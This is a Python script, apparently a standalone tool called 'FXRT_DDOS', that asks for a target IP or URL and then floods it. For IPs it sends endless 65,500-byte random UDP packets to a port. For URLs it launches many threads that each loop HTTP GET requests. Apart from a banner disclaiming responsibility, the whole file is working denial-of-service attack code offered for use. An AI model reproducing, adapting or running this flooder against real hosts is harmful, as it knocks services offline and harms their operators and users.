#creator: Fxrt2711
#version: 4.0.5
#date: 25/1/24
#update: 28/1/24
#
try:
    import os
except:
    exit("missing MAIN lib: os !! \n install it with: pip install os")
try:
    import sys
except:
    exit("missing MAIN lib: sys !! \n install it with: pip install sys")
try:
    from ping3 import ping, verbose_ping
except:
    exit("missing MAIN lib: ping3 !! \n install it with: pip install ping3")
try:
    from colorama import Fore
except:
    exit("missing lib: colorama !! \n install it with: pip install colorama")
try:
    import threading
except:
    exit("missing lib: threading !! \n install it with: pip install treading")
try:
    import requests
except:
    exit("missing lib: requests !! \n install it with: pip install requests")
try:
    from time import sleep
except:
    exit("missing lib: time !! \n install it with: pip install time")
try:
    import socket
except:
    exit("missing lib: socket !! \n install it with: pip install socket")
try:
    import random
except:
    exit("missing lib: socket !! \n install it with: pip install socket")
#
op_sy = sys.platform
#
#
def clear():
    if op_sy == ("linux"):
        os.system("clear")
    else:
        os.system("cls")
#
#
def dos_trget(target,st,portp):
#
    bytes_num = 0
    if st == ("ip"):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#
    while True:
        bytes_num = bytes_num + 1
        try:
            if st == ("ip"):
                try:
#
                    bytes = random._urandom(65500)
                    sock.sendto(bytes,(target, portp))
                    print(Fore.GREEN + f"{bytes_num} sended to {target}")
#
                except:
                    try:
                        print(f"waiting for {target} to accept")
                    except:
                        exit()
                try:
                    pass
                except:
                    exit()
#
            else:
                rves = requests.get(target)
                rxes = requests.get(target)
                try:
                    print(f"Requests: {bytes_num} sented to {target}")
                except:
                    exit()
#
        except requests.exceptions.ConnectionError:
            sleep(0.1)
            try:
                print("Check internet connection")
            except:
                exit()
#
#
while True:
    clear()
    print(Fore.RED + """

                ╔═══╗╔═╗╔═╗╔═══╗╔════╗    ╔═══╗╔═══╗╔═══╗╔═══╗
                ║╔══╝╚╗╚╝╔╝║╔═╗║║╔╗╔╗║    ╚╗╔╗║╚╗╔╗║║╔═╗║║╔═╗║
                ║╚══╗ ╚╗╔╝ ║╚═╝║╚╝║║╚╝     ║║║║ ║║║║║║ ║║║╚══╗
                ║╔══╝ ╔╝╚╗ ║╔╗╔╝  ║║       ║║║║ ║║║║║║ ║║╚══╗║
               ╔╝╚╗  ╔╝╔╗╚╗║║║╚╗ ╔╝╚╗     ╔╝╚╝║╔╝╚╝║║╚═╝║║╚═╝║
               ╚══╝  ╚═╝╚═╝╚╝╚═╝ ╚══╝     ╚═══╝╚═══╝╚═══╝╚═══╝
        (◣_◢)I am not responsible for damage caused by FXRT_DDOS (◣_◢)
    (◣_◢)Attacking targets without prior mutual consent is ILLIGAL!!!(◣_◢)
    """)
#
    run_url = True
    run_http_url = True
    run_https_url = True
    run_ip = True
    run_port = True
    run_threads = True
    run_target_selsection = True
#
    while run_target_selsection:
#       
        print ("")
        print (Fore.GREEN + "do you want to ddos (ip)(https)(http)")
        un_selection_input = input("~> ")
        selection_input = un_selection_input.replace(' ','')
#
        if selection_input == ("http"):
            while run_http_url:
#
                unh_target_url_ip = input(Fore.GREEN + "Enter URL~> ")
                target_url_ip = unh_target_url_ip.replace(' ','')
#
                if target_url_ip.startswith("https"):
                    print(Fore.RED + "wrong url. you can,t ddos https")
                    pass
#
                elif not target_url_ip.__contains__("."):
                    print(Fore.RED + "invalid domain")
                    pass
#
                else:
                    run_http_url = False
                    run_target_selsection = False
#
        elif selection_input == ("https"):
            while run_https_url:
#
                unhp_target_url_ip = input(Fore.GREEN + "Enter URL~> ")
                target_url_ip = unhp_target_url_ip.replace(' ','')
#               
                if not target_url_ip.startswith("https"):
                    print(Fore.RED + "wrong url. you can,t ddos http")
                    pass
#
                elif not target_url_ip.__contains__("."):
                    print(Fore.RED + "invalid domain")
                    pass
#
                else:
                    run_https_url = False
                    run_target_selsection = False
#
        elif selection_input == ("ip"):
            while run_ip:
#
                unip_target_url_ip = input(Fore.GREEN + "Enter IP~> ")
#               
                target_url_ip = unip_target_url_ip.replace(' ','')
#
                if not target_url_ip.__contains__("."):
                    print(Fore.RED + "invalid ip")
                    pass
#
                else:
                    run_ip = False
#
            while run_port:
                print(Fore.GREEN + "\ndefult port: 80 \ndo you want to use port 80 ? \n[Y/n]")
                port_u_s = input("~> ")
#
                if port_u_s == ("Y"):
                    port = 80
                elif port_u_s == ("y"):
                    port = 80
                elif port_u_s == (""):
                    port = 80
                else:
                    unipp_port = input(Fore.GREEN + 'Enter Port~> ')
                    port = unipp_port.replace(' ','')
#
                if len(str(port)) > 4:
                    print(Fore.RED + "invalid port")
                    pass
                else:
                    run_port = False
                    run_target_selsection = False
#
        else:
            pass
#
#
    
    while run_threads:
        if selection_input == ("ip"):
            run_threads = False
        else:
#
            try:
#               
                threads = int(input(Fore.GREEN + "Threads: " + Fore.RED + ""))
#
                if threads <= 0:
                    print("invalid number")
                    pass
                elif threads == ():
                    print("invalid number")
                    pass
                else:
                    run_threads = False
#
            except:
                print("invalid number")
                pass
# 
#
    print("press enter to start the attack")
    nothing = input("")
    port = 80
#
    if not selection_input == ("ip"):
        for i in range(0, threads):
#
            thr = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_1 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_2 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_3 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_4 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_5 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_6 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_7 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_8 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_9 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_10 = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_1_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_2_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_3_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_4_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_5_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_6_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_7_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_8_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_9_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
            thr_10_ = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",80,))
#
            thr.start()
            thr_1.start()
            thr_2.start()
            thr_3.start()
            thr_4.start()
            thr_5.start()
            thr_6.start()
            thr_7.start()
            thr_8.start()
            thr_9.start()
            thr_10.start()
            thr_1_.start()
            thr_2_.start()
            thr_3_.start()
            thr_4_.start()
            thr_5_.start()
            thr_6_.start()
            thr_7_.start()
            thr_8_.start()
            thr_9_.start()
            thr_10_.start()
            try:
                print(f"waiting for {target_url_ip} to accept")
            except:
                exit()
    else:
        dos_trget(target_url_ip,"ip",port)
